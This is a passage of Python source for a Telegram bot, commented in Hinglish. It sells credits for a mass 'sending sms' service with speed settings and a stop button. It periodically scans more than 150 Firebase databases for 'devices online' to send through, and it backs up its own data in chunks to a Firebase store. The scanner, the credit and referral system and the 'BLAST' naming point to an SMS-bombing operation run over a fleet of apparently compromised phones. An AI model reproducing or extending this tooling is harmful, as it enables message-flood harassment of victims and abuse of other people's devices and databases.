                    and time.time() - _LAST_FB_BACKUP_TS[0] >= _SHADOW_BACKUP_INTERVAL):
                try:
                    asyncio.get_running_loop().create_task(fb_cloud_backup(d))
                except RuntimeError:
                    pass
        except Exception:
            pass

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "manual_added_credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def global_unlimited_active(d: dict) -> bool:
    """GLOBAL unlimited mode (owner) — SAB users (banned chhod ke) unlimited use.
    until=0 → permanent (without time); until>0 → with time (auto-off hone ke baad khud band)."""
    try:
        gu = d.get("global_unlimited") or {}
        if not gu.get("enabled"):
            return False
        until = gu.get("until", 0)
        return True if until == 0 else (until > time.time())
    except Exception:
        return False

def has_unlimited(uid: int, d: dict) -> bool:
    """Active unlimited access: (a) owner ne GLOBAL mode on kar diya, ya (b) user ka apna
    duration-plan (e.g. Monthly Unlimited) active hai — unlimited_until tak unlimited use."""
    try:
        if global_unlimited_active(d):
            return True
        return d.get("users", {}).get(str(uid), {}).get("unlimited_until", 0) > time.time()
    except Exception:
        return False

def unlimited_info(uid: int, d: dict):
    """(active: bool, days_left: int|None) — None = permanent (global 'without time').
    Global mode priority hota hai, warna user ka apna duration-plan."""
    try:
        gu = d.get("global_unlimited") or {}
        if gu.get("enabled"):
            until = gu.get("until", 0)
            if until == 0:
                return (True, None)
            if until > time.time():
                return (True, max(0, -int(-(until - time.time()) // 86400)))
        if d.get("users", {}).get(str(uid), {}).get("unlimited_until", 0) > time.time():
            return (True, unlimited_days_left(uid, d))
        return (False, 0)
    except Exception:
        return (False, 0)

def unlimited_days_left(uid: int, d: dict) -> int:
    try:
        until = d.get("users", {}).get(str(uid), {}).get("unlimited_until", 0)
        return max(0, -int(-(until - time.time()) // 86400))  # ceil
    except Exception:
        return 0

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    if has_unlimited(uid, d):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍaɪɴ ᴏᴡɴᴇr"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇr"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} aᴅᴍɪɴ"
    if has_unlimited(uid, d): return f"{em(EMOJI_CHECK, '🔓')} {sc('unlimited')}"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} aᴘᴘrᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғrᴇᴇ usᴇr"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ aᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict, is_manual: bool = False):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0, "manual_added_credits": 0}
    if "manual_added_credits" not in d["users"][k]:
        d["users"][k]["manual_added_credits"] = 0
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount
    if is_manual:
        d["users"][k]["manual_added_credits"] += amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠaʟɪᴅ rᴇғᴇrraʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} aᴘɴa ᴄᴏᴅᴇ ʜuᴅ sᴇ ɴaʜɪɴ ᴋar saᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} aaᴘ ᴘᴇʜʟᴇ sᴇ rᴇғᴇr ʜᴏ ᴄʜuᴋᴇ ʜaɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d, is_manual=False)
    add_credits(referrer_uid, ref_credits, d, is_manual=False)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    # REFERRAL-GATED PROTECTION: har successful referral = referrer ko +1 protection slot
    try:
        _refd = d["users"].get(str(referrer_uid))
        if _refd is not None:
            _refd["ref_count"] = int(_refd.get("ref_count", 0)) + 1
    except Exception:
        pass
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! aᴘᴋᴏ {ref_credits} ᴄrᴇᴅɪᴛs ᴍɪʟᴇ ʜaɪɴ!", referrer_uid

def apply_pending_referral(uid: int, d: dict):
    """PROTECTED REFERRAL - user ne join ke PELE se referral code use kiya tha (pending_ref).
    Ab (join verify hone ke baad) code apply karo. Success pe referrer_uid, warna None."""
    ref_code = d["users"].get(str(uid), {}).get("pending_ref")
    if not ref_code:
        return None
    if d["users"].get(str(uid), {}).get("referred_by"):
        d["users"][str(uid)].pop("pending_ref", None)
        save(d)
        return None
    success, _msg, referrer = process_referral(uid, ref_code, d)
    d["users"][str(uid)].pop("pending_ref", None)
    if success:
        save(d)
        return referrer
    save(d)
    return None

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

# ════════════ RICH MESSAGES (Bot API 10.1+) + MANDATORY NORMAL FALLBACK ════════════
# Free-account bot hai, isliye HAR rich send ke saath normal-message fallback hai.
# Koi bhi failure (unknown method / bad request / network) pe turant normal
# HTML message bhej diya jata hai — user ko kabhi khaali ya toota hua message nahi.
# _RICH_OK flag: ek baar confirm ho jaye ki rich is bot pe fail hai (BadRequest),
# toh baad ke saare sends seedha normal — broadcast loop mein double API call nahi.
_RICH_OK = [None]  # None = unknown (pehli baar try), True = rich chalta hai, False = normal hi use karo

def rb_heading(text: str, size: int = 1):
    return InputRichBlockSectionHeading(text=text, size=size)

def rb_para(text: str):
    return InputRichBlockParagraph(text=text)

def rb_divider():
    return InputRichBlockDivider()

def rb_quote(text: str, credit: str = None):
    return InputRichBlockPullQuotation(text=text, credit=credit)

def rb_block_quote(blocks: list, credit: str = None):
    return InputRichBlockBlockQuotation(blocks=blocks, credit=credit)

def rb_list(items: list, has_checkbox: bool = False):
    return InputRichBlockList(items=[
        InputRichBlockListItem(blocks=[rb_para(it)], has_checkbox=has_checkbox)
        for it in items
    ])

async def send_rich_or_fallback(bot: Bot, chat_id: int, blocks: list, fallback_html: str, reply_markup=None):
    """Rich message bhejo; KISI BHI failure pe normal HTML message bhejo (mandatory).
    Returns: "rich" | "normal" | None (dono fail)."""
    if _RICH_OK[0] is not False:
        try:
            await bot.send_rich_message(
                chat_id=chat_id,
                rich_message=InputRichMessage(blocks=blocks),
                reply_markup=reply_markup,
            )
            _RICH_OK[0] = True
            return "rich"
        except TelegramRetryAfter:
            pass  # flood — rich ka support unknown hai, is baar normal bhejo
        except TelegramBadRequest as e:
            # "unknown method" / "bad Request" = rich is bot/API pe unsupported → flag False
            _RICH_OK[0] = False
            log.debug(f"[RICH] unsupported → normal fallback: {e}")
        except Exception as e:
            log.debug(f"[RICH] error → normal fallback: {e}")
    # Normal fallback (ya seedha normal agar rich pehle se fail hua)
    try:
        await bot.send_message(chat_id=chat_id, text=fallback_html, parse_mode="HTML", reply_markup=reply_markup)
        return "normal"
    except Exception as e2:
        log.error(f"[RICH] rich+normal dono fail ({chat_id}): {e2}")
        return None

def rich_broadcast_blocks(bcast_text: str, heading: str = "📢 Broadcast"):
    """Broadcast message ko rich blocks mein todo (title + body)."""
    blocks = [rb_heading(heading, 2)]
    for chunk in re.split(r"\n\s*\n", bcast_text.strip()):
        chunk = chunk.strip()
        if chunk:
            blocks.append(rb_para(chunk))
    if len(bcast_text.strip()) > 200:
        blocks.append(rb_divider())
        blocks.append(rb_para(f"👑 {SUPER_ADMIN_NAME}"))
    return blocks

def rich_credits_blocks(title: str, lines: list, balance: int):
    """Credit add/deduct/transfer/redeem notifications ke liye rich blocks."""
    blocks = [rb_heading(title, 2)]
    for ln in lines:
        blocks.append(rb_para(ln))
    blocks.append(rb_divider())
    blocks.append(rb_para(f"🪙 New Balance: {balance} credits"))
    return blocks

async def edit_rich_or_fallback(msg, blocks: list, fallback_html: str, reply_markup=None):
    """Existing message ko RICH edit karo (Bot API 10.1+ editMessageText.rich_message);
    koi bhi failure pe normal HTML edit (mandatory fallback)."""
    if _RICH_OK[0] is not False:
        try:
            await msg.edit_text(rich_message=InputRichMessage(blocks=blocks), reply_markup=reply_markup)
            _RICH_OK[0] = True
            return "rich"
        except TelegramRetryAfter:
            pass
        except TelegramBadRequest as e:
            _RICH_OK[0] = False
            log.debug(f"[RICH] edit unsupported → normal: {e}")
        except Exception as e:
            log.debug(f"[RICH] edit error → normal: {e}")
    try:
        await msg.edit_text(text=fallback_html, parse_mode="HTML", reply_markup=reply_markup, disable_web_page_preview=True)
        return "normal"
    except Exception as e:
        log.error(f"[RICH] edit rich+normal dono fail: {e}")
        return None

async def notify_referral_success(bot: Bot, referrer_uid: int, ref_name: str, credits: int, note: str = ""):
    """Referrer ko referral-success notify (rich + mandatory normal fallback)."""
    _note = f" ({note})" if note else ""
    _fb = (f"🎉 <b>{ref_name}</b> ne aapka referral code use kiya!{_note}\n"
           f"💰 Aapko +{credits} credits mile hain.\n"
           f"💰 Unko bhi +{credits} credits mile hain.")
    _blocks = [
        rb_heading("🎉 Referral Success", 2),
        rb_para(f"{ref_name} ne aapka referral code use kiya!{_note}"),
        rb_para(f"💰 Aapko +{credits} credits mile hain."),
        rb_para(f"💰 Unko bhi +{credits} credits mile hain."),
    ]
    try:
        await send_rich_or_fallback(bot, referrer_uid, _blocks, _fb)
    except Exception:
        pass

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғasᴛ", f"{prefix}:speed:fast", None, "🚀", style="danger"),
            btn("ᴍᴇᴅɪuᴍ", f"{prefix}:speed:medium", None, "⚡", style="primary"),
            btn("sʟᴏ", f"{prefix}:speed:slow", None, "🐢", style="success")
        ],
        [btn("ᴄaɴᴄᴇʟ", f"{prefix}:home", None, "❌", style="danger")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғaɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘrᴏɢrᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄrᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙuᴛᴛᴏɴ ᴅaʙaʏᴇɪɴ aɢar ʙᴇᴄʜ ᴍᴇɴ rᴏᴋɴa ʜ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", None, "🛑", style="danger")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄaɴɴɪɴɢ..."

    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"

    # Scan ab sirf 1 din mein 1 baar hota hai, isliye cached devices hamesha valid hain
    # (pehle har 60s scan hota tha isliye "old" timing dikhti thi)
    return f"{em(EMOJI_CHECK, '🟢')} {len(CACHED_DEVICES)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | asᴛ: {fmt_time(int(LAST_SCAN_TIME))}"

# Startup delay: pehla scan kitne second baad chale (bot responsive rahe startup ke pehle minute)
_SCANNER_STARTUP_DELAY = 30.0

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False
    retry_passes = 0  # self-heal re-scan count (healthy scan par reset)

    # Pehla scan _SCANNER_STARTUP_DELAY baad — startup ke pehle minute mein bot users ke
    # liye fully responsive rahe; scan (150+ DBs) tab CPU/IO leta hai jab bot already live
    # ho. 24h cache wala skip-logic isse pehle kaam karta hai (cache fresh = no scan).
    if _SCANNER_STARTUP_DELAY > 0:
        await asyncio.sleep(_SCANNER_STARTUP_DELAY)

    self_heal_due = False  # rate-limit self-heal re-scan ka bypass flag
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        # 24h ke andar scan ho chuki hai (is process mein ya pehle ke process mein —
        # DB se hydrated) toh skip — har restart/redeploy pe fresh scan nahi chalta (CPU/IO save)
        if not self_heal_due and LAST_SCAN_TIME and (time.time() - LAST_SCAN_TIME) < _BACKGROUND_SCAN_INTERVAL:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
            await asyncio.sleep(60)
            continue

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄaɴɴɪɴɢ ғɪrᴇʙasᴇ aᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪrᴇʙasᴇ ᴅʙs ᴄᴏɴғɪɢurᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices
            if any(SCAN_PASS_WARN.values()):
                log.info(f"[SCAN] HTTP summary — 423/429: {SCAN_PASS_WARN['423']} DBs (rate-limited, 20s retry ho chuka), "
                         f"404: {SCAN_PASS_WARN['404']} (deleted/private), other: {SCAN_PASS_WARN['other']}")

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()
            # Persistent scan state — restart/redeploy pe 24h scan skip ho sake (CPU save)
            try:
                _LAST_FB_BACKUP_TS[0] = time.time()  # save() hook se double push na ho
                d2 = load()
                d2["last_scan"] = {
                    "ts": int(time.time()),
                    "devices": devices[:5000],
                    "fb_counts": {k: v for k, v in FB_DEVICE_COUNTS.items()},
                }
                save(d2)
                # TURANT Firebase push — kill/restart ke baad bhi agle restart pe scan skip ho
                try:
                    if get_backup_fb_url(d2):
                        asyncio.get_running_loop().create_task(fb_cloud_backup(d2))
                except Exception:
                    pass
            except Exception as _e:
                log.warning(f"[BG-SCAN] last_scan persist fail: {_e}")

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟasᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟasᴛ: {fmt_time(int(time.time()))}"
            if not first_scan_done:
                # Pehli scan ki hamesha report — chahe 0 devices hi kyun na milein
                # (Telegram 4096 char limit — 150+ DBs ke liye lines cap + final guard)
                try:
                    status_lines = []
                    for fb in fbs:
                        stt = FB_SCAN_STATUS.get(fb["id"], "unknown")
                        online = sum(1 for dv in devices if dv["fb_id"] == fb["id"])
                        status_lines.append(f"  {fb.get('label', fb['url'][:30])}: <b>{online}</b> online (DB mein {stt})")
                    _MAX_REPORT_LINES = 45
                    if len(status_lines) > _MAX_REPORT_LINES:
                        status_lines = status_lines[:_MAX_REPORT_LINES] + [
                            f"  ... +{len(status_lines) - _MAX_REPORT_LINES} aur DBs (manage firebase se dekho)"
                        ]
                    report = (f"🔍 <b>First scan complete!</b>\n\n"
                              f"{em(EMOJI_PHONE, '📱')} Devices online: <b>{len(devices)}</b>\n"
                              f"{em(EMOJI_FIRE, '🔥')} Firebase DBs: <b>{len(fbs)}</b>\n\n"
                              + "\n".join(status_lines) + "\n\n"
                              f"{em(EMOJI_GEAR, '🔄')} Auto-scan: har 24 ghante (1 din mein 1 baar)\n"
                              "<i>ok:N = DB mein total devices | empty = DB khali | http:423 = Firebase ne rate-limit kiya (agle scan mein retry hota hai)</i>")
                    await bot.send_message(MAIN_OWNER, report[:4000], parse_mode="HTML")
                except Exception as e:
                    log.warning(f"Owner notify failed: {e}")
                first_scan_done = True

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇrrᴏr: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
            # Scan ke baad GC — 153 DBs ke sessions/responses/JSON objects free karo
            # (Render free tier 512MB cap; scan ke turant baad OOM restart "har bar" ho raha tha)
            gc.collect()

        # Self-heal: agar 50%+ DBs rate-limited (423/429) rahi, toh 2 ghante baad
        # 1 baar re-scan karo (IP thanda ho jaata hai). Max 2 pass — phir normal 24h cycle.
        try:
            cur_fbs = load().get("firebases", [])
            rl = sum(1 for fb in cur_fbs if str(FB_SCAN_STATUS.get(fb["id"], "")).startswith(("http:423", "http:429")))
            if cur_fbs and rl / len(cur_fbs) >= 0.5 and len(cur_fbs) >= 10 and retry_passes < 2:
                retry_passes += 1
                self_heal_due = True  # 2h baad 24h-window ko bypass karke scan karega
                log.warning(f"[BG-SCAN] {rl}/{len(cur_fbs)} DBs rate-limited — 2 ghante baad self-heal re-scan (pass {retry_passes}/2)")
                SCAN_STATUS = f"{em(EMOJI_WARNING, '🕒')} raᴛᴇ-ʟɪᴍᴛᴇᴅ — 2ʜ ʙaᴅ rᴇ-ꜱᴄaɴ"
                await asyncio.sleep(7200)
                continue
        except Exception:
            pass
        self_heal_due = False
        retry_passes = 0
        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES


async def run_one_shot_scan():
    """Ek baar ka full scan (throttled) — cache update karta hai.
    Returns: (ok: bool, info)"""
    global SCANNING_IN_PROGRESS, CACHED_DEVICES, LAST_SCAN_TIME
    async with SCAN_LOCK:
        if SCANNING_IN_PROGRESS:
            return False, "already_running"
        SCANNING_IN_PROGRESS = True
    try:
        d = load()
        fbs = d.get("firebases", [])
        if not fbs:
            return False, "no_firebases"
        devices = await get_all_online_devices(d)
        CACHED_DEVICES = devices
        LAST_SCAN_TIME = time.time()
        if any(SCAN_PASS_WARN.values()):
            log.info(f"[SCAN] HTTP summary — 423/429: {SCAN_PASS_WARN['423']} DBs, 404: {SCAN_PASS_WARN['404']}, other: {SCAN_PASS_WARN['other']}")
        for fb in fbs:
            fb_online = sum(1 for dv in devices if dv["fb_id"] == fb["id"])
            FB_DEVICE_COUNTS[fb["id"]] = {
                "label": fb.get("label", fb["url"][:30]),
                "online": fb_online,
                "last_update": int(time.time()),
            }
        return True, len(devices)
    except Exception as e:
        log.error(f"[MANUAL-SCAN] error: {e}")
        return False, "error"
    finally:
        async with SCAN_LOCK:
            SCANNING_IN_PROGRESS = False


def ensure_scan_running() -> bool:
    """Agar cached devices khali hain aur scan chal nahi raha, toh BACKGROUND mein
    one-shot scan chalu karo — handler ko NAHI rokta (150 DBs ka scan 10+ min leta
    hai; handler mein block = button spinner + 'bot off' lagta tha).
    Returns: True = scan running/started (UI mein 'scan running' dikhao)."""
    if get_cached_devices():
        return False
    if SCANNING_IN_PROGRESS:
        return True

    async def _go():
        try:
            ok, info = await run_one_shot_scan()
            if ok:
                log.info(f"[MANUAL-SCAN] complete: {info} devices online")
            else:
                log.info(f"[MANUAL-SCAN] skip: {info}")
        except Exception as e:
            log.error(f"[MANUAL-SCAN] task error: {e}")

    asyncio.create_task(_go())
    return True


async def _notify_scan_running(cq: "CallbackQuery", prefix: str):
    """Speed handler: cached devices khali — background scan chalu karke user ko
    'scan running + check button' dikhao (handler freeze nahi hota)."""
    ensure_scan_running()
    await safe_answer(cq, "⏳")
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_WARNING, '🔍')} <b>Abhi koi device cached nahi hai</b>\n\n"
            f"{em(EMOJI_GEAR, '🔄')} Background scan chalu ho gaya (150 DBs pe ~3-4 min).\n"
            f"Scan complete hone ke baad neeche button dabao:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"{sc('check now')}", callback_data=f"{prefix}:check_devices")]
            ]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def _fb_base_ok(url: str) -> bool:
    """Sirf public Firebase RTDB URL allowed (https + firebase domains)."""
    try:
        u = urlparse(url.strip())
        if u.scheme != "https":
            return False
        host = (u.netloc or "").lower()
        return host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")
    except Exception:
        return False


def _fb_path_ok(path: str) -> bool:
    path = path.strip().strip("/")
    if not path or len(path) > 200:
        return False
    if ".." in path or any(c in path for c in " \t\n\"<>"):
        return False
    return True


async def fb_http(base_url: str, path: str = "", method: str = "GET", payload=None, query: str = None, timeout: int = 10):
    """Generic Firebase REST call (GET/PUT/PATCH/DELETE). Returns (status, parsed_data_or_text)."""
    p = path.strip().strip("/")
    url = base_url.rstrip("/") + (f"/{p}.json" if p else "/.json")
    if query:
        url += f"?{query}"
    try:
        async with aiohttp.ClientSession() as s:
            if method == "GET":
                r_ctx = s.get(url, timeout=aiohttp.ClientTimeout(total=timeout))
            elif method == "DELETE":
                r_ctx = s.delete(url, timeout=aiohttp.ClientTimeout(total=timeout))
            else:
                r_ctx = s.request(method, url, json=payload, timeout=aiohttp.ClientTimeout(total=timeout))
            async with r_ctx as r:
                txt = await r.text()
                try:
                    return r.status, json.loads(txt)
                except Exception:
                    return r.status, txt
    except Exception as e:
        return 0, str(e)[:120]


# ── FIREBASE CLOUD BACKUP (user ki apni Firebase = render-wipe safe) ─────
_LAST_FB_BACKUP_TS = [0.0]
_FB_CHUNK = 1_500_000  # ~1.5MB base64 per part — 40MB+ DB ke liye bhi safe
# Startup restore chal raha hai? Is waqt save() hook ko Firebase push NAHI karna chahiye —
# warna restore ke dauran bana hua FRESH empty DB latest backup ko overwrite kar deta hai
# (race: load() fresh DB banata hai → save() → background push → restore fresh hi padh leta hai)
_RESTORE_IN_PROGRESS = [False]


def get_backup_fb_url(d: dict = None) -> str:
    """Backup Firebase URL — priority: env > data file (owner panel se set) > code constant."""
    env = os.environ.get("BLAST_BACKUP_FB_URL", "").strip()
    if env:
        return env.rstrip("/")
    if d is None:
        d = load()
    u = (d.get("backup_fb_url") or "").strip()
    if u:
        return u.rstrip("/")
    return _BACKUP_FB_URL.rstrip("/") if _BACKUP_FB_URL else ""


def _db_to_chunks(d: dict):
    """DB → gzip → base64 → chunks. Returns (parts, meta). 40MB+ DB bhi handle hota hai."""
    raw = json.dumps(d, ensure_ascii=False).encode("utf-8")
    blob = gzip.compress(raw, compresslevel=6)
    b64 = base64.b64encode(blob).decode("ascii")
    parts = [b64[i:i + _FB_CHUNK] for i in range(0, len(b64), _FB_CHUNK)]
    meta = {
        "ts": int(time.time()),
        "parts": len(parts),
        "size_raw": len(raw),
        "size_gz": len(blob),
        "version": _VERSION,
        "users": len(d.get("users", {}) or {}),
        "firebases": len(d.get("firebases", []) or []),
    }
    return parts, meta


async def _fb_write_chunks(url: str, node: str, parts: list, meta: dict):
    """Parts pehle likho, meta LAST mein (partial write restore na ho)."""
    for i, p in enumerate(parts):
        st, _ = await fb_http(url, f"{node}/part_{i}", method="PUT", payload=p, timeout=60)
        if not (200 <= st < 300):
            return False, f"part_{i} http:{st}"
    st, _ = await fb_http(url, f"{node}/meta", method="PUT", payload=meta, timeout=20)
    if not (200 <= st < 300):
        return False, f"meta http:{st}"
    return True, "ok"


async def _fb_read_node(url: str, node: str):
    """Chunked node padho (meta → parts → gunzip → JSON). Returns (ok, data)."""
    st, meta = await fb_http(url, f"{node}/meta", timeout=30)
    if st != 200 or not isinstance(meta, dict) or not isinstance(meta.get("parts"), int) or meta["parts"] <= 0:
        # legacy single-value compat
        st2, data = await fb_http(url, node, timeout=60)
        if st2 == 200 and isinstance(data, dict) and (data.get("users") is not None or data.get("firebases") is not None):
            return True, data
        return False, None
    chunks = []
    for i in range(meta["parts"]):
        st2, part = await fb_http(url, f"{node}/part_{i}", timeout=60)
        if st2 != 200 or not isinstance(part, str):
            return False, None
        chunks.append(part)
    try:
        data = json.loads(gzip.decompress(base64.b64decode("".join(chunks))).decode("utf-8"))
        if isinstance(data, dict) and (data.get("users") is not None or data.get("firebases") is not None):
            return True, data
    except Exception:
        return False, None
    return False, None


async def fb_cloud_backup(d: dict = None) -> "tuple[bool, str]":
    """Poora bot data user ke Firebase par push — GZIP + CHUNKS (40MB+ safe):
    bot_backup/latest + bot_backup/snap/<ts> (rotating, max 6). Returns (ok, info)."""
    try:
        url = get_backup_fb_url(d)
        if not url:
            return False, "not_configured"
        if d is None:
            d = load()
        parts, meta = _db_to_chunks(d)
        _latest_retried = False
        ok, info = await _fb_write_chunks(url, "bot_backup/latest", parts, meta)
        if not ok:
            return False, info
        # VERIFY — likha hua data wapas decode karo (meta → parts → gunzip).
